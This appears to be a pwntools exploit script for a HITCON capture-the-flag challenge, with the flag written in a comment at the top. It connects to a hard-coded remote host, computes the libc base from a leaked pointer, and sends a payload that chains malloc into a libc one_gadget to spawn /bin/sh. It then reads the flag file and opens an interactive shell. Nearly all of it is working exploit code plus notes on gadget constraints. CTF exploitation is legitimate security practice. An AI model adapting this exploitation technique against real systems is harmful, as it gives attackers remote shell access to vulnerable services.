#!/usr/bin/env python
from pwn import *

# hitcon{make_one_gadget_great_again!}

context.arch = 'amd64'
l = ELF('./libc.so.6')


host , port = '13.113.242.0' , 31337
y = remote( host , port )

'''
0x4557a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xcde41 execve("/bin/sh", r15, r13)
constraints:
  [r15] == NULL || r15 == NULL
  [r13] == NULL || r13 == NULL

0xce0e1 execve("/bin/sh", [rbp-0x78], [rbp-0x50])
constraints:
  [[rbp-0x78]] == NULL || [rbp-0x78] == NULL
  [[rbp-0x50]] == NULL || [rbp-0x50] == NULL

0xf1651 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0xf24cb execve("/bin/sh", rsp+0x60, environ)
constraints:
  [rsp+0x60] == NULL
'''

'''
ce0e9:	48 8d 3d 50 cb 0b 00 	    lea    rdi,[rip+0xbcb50]        # 18ac40 <_libc_intl_domainname@@GLIBC_2.2.5+0x180>
ce0f0:	4c 89 ce             	    mov    rsi,r9
ce0f3:	e8 68 f6 ff ff       		  call   cd760 <execve@@GLIBC_2.2.5>

constrains:
  r9  == 0
  rdx == 0

'''

# After calling `malloc` it let `r9 = 0` and `rdx = 0` , Wonderful!!!!!!!

l.address += int( y.recvline()[2:-1] , 16 ) - 0x203f1
log.success( 'libc -> %s' % hex( l.address ) )

magic = 0xce0e1 + 0x8 # Don't want the constains which can't be satisfied.

p = flat(
    l.symbols['malloc'], # magic ...
    l.address + magic
)

sleep( 0.7 )

y.send( p )

sleep( 0.7 )

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()
